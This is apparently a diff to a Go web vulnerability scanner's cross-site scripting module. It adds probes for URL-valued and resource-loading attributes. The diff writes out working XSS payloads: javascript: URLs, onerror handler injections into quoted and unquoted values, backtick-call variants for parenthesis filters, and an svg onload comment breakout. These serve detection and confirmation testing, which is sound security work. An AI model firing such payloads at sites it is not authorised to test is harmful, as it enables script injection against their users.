@@ -67,6 +67,17 @@ func xssPayloadsForContexts(contexts []xssContext) []xssPayload {
 				confirm: confirmAltHandlerBreakout})
 
 		case xssCtxAttrValue:
+			// A URL-valued attribute gets the scheme payload, and is STILL an attribute value: the
+			// quote-closing and attribute-injection breakouts below apply to it exactly as to any
+			// other. Treating the URL case as exclusive left <img src=…> with nothing but a
+			// javascript: URL, which no browser runs from an image source, so an unescaped or
+			// unquoted src was never probed with a payload that could work there.
+			if c.IsURLAttr() {
+				// The scheme is the exploit. No tag is opened and no quote is needed, so a
+				// quote-closing payload produces nothing here.
+				add(xssPayload{build: javascriptURLPayload, note: "javascript: scheme in a URL-valued attribute",
+					confirm: confirmJavaScriptURL, bit: XSSEvidenceURLScheme})
+			}
 			switch {
 			case c.IsHTMLAttr():
 				// srcdoc's value is unescaped back into markup before the inner document is
@@ -75,11 +86,6 @@ func xssPayloadsForContexts(contexts []xssContext) []xssPayload {
 				// every other context asks for and why substring matching on raw markup missed it.
 				add(xssPayload{build: srcdocBreakoutPayload, note: "markup via an HTML-valued attribute (srcdoc)",
 					confirm: confirmSrcdocBreakout})
-			case c.IsURLAttr():
-				// The scheme is the exploit. No tag is opened and no quote is needed, so a
-				// quote-closing payload produces nothing here.
-				add(xssPayload{build: javascriptURLPayload, note: "javascript: scheme in a URL-valued attribute",
-					confirm: confirmJavaScriptURL, bit: XSSEvidenceURLScheme})
 			case c.IsEventAttr():
 				// The value is already JavaScript, but that does NOT mean an expression suffices: the
 				// canary almost always lands inside a string literal in that handler, and a host that
@@ -103,6 +109,15 @@ func xssPayloadsForContexts(contexts []xssContext) []xssPayload {
 					})
 				}
 			case c.Quote == 0:
+				if loadsResource(c.TagName) {
+					// An element that loads a resource fires error when the load fails, with no
+					// user action and no focus. onfocus never fires on an <img> at all, so on such
+					// an element the error handler is the injection that actually runs.
+					add(xssPayload{build: unquotedAttrErrorPayload, note: "error-handler injection into an unquoted value",
+						confirm: confirmEventAttrInjection, bit: XSSEvidenceAttrInjection})
+					add(xssPayload{build: unquotedAttrErrorBacktickPayload, note: "error-handler injection into an unquoted value (backtick call)",
+						confirm: confirmEventAttrInjectionBacktick, bit: XSSEvidenceAttrInjection})
+				}
 				// An unquoted value ends at the first space, so a space and an event-handler
 				// attribute inject onto the element that is already there. Nothing needs closing,
 				// which is exactly why no quote-based marker could ever appear.
@@ -118,6 +133,14 @@ func xssPayloadsForContexts(contexts []xssContext) []xssPayload {
 					confirm: confirmEventAttrInjectionBacktick, bit: XSSEvidenceAttrInjection})
 			default:
 				quote := c.Quote
+				if loadsResource(c.TagName) {
+					add(xssPayload{
+						build:   func(canary string) string { return quotedAttrErrorPayload(quote, canary) },
+						note:    "error-handler injection into a quoted value",
+						confirm: confirmEventAttrInjection,
+						bit:     XSSEvidenceAttrInjection,
+					})
+				}
 				add(xssPayload{
 					build:   func(canary string) string { return quotedAttrBreakoutPayload(quote, canary) },
 					note:    "tag breakout from a quoted attribute value",
@@ -322,4 +345,35 @@ func rcdataBreakoutPayload(tag, canary string) string {
 // commentBreakoutPayload closes the comment before opening an element.
 func commentBreakoutPayload(canary string) string {
 	return `--><svg id=` + canary + ` onload=alert(1)>`
+}
+
+// resourceLoadingTags are elements that fetch a resource named by an attribute and dispatch error
+// when the fetch fails, on insertion and without any user action.
+var resourceLoadingTags = map[string]bool{
+	"img": true, "image": true, "input": true, "video": true, "audio": true,
+	"source": true, "track": true, "embed": true, "object": true,
+}
+
+func loadsResource(tag string) bool { return resourceLoadingTags[tag] }
+
+// unquotedAttrErrorPayload injects an error handler onto a resource-loading element. The canary
+// leads, so the attribute being injected into keeps a value (a relative URL that will not load),
+// and it sits inside the handler so the injection is confirmable.
+func unquotedAttrErrorPayload(canary string) string {
+	return canary + ` onerror=alert(` + canary + `)`
+}
+
+// unquotedAttrErrorBacktickPayload is unquotedAttrErrorPayload with the call in backticks, for a
+// host that filters parentheses (see unquotedAttrBacktickPayload).
+func unquotedAttrErrorBacktickPayload(canary string) string {
+	return canary + " onerror=alert`" + canary + "`"
+}
+
+// quotedAttrErrorPayload closes a quoted value and adds an error handler, without opening a tag.
+func quotedAttrErrorPayload(quote byte, canary string) string {
+	q := `"`
+	if quote == '\'' {
+		q = `'`
+	}
+	return canary + q + ` onerror=` + q + `alert(` + canary + `)`
 }
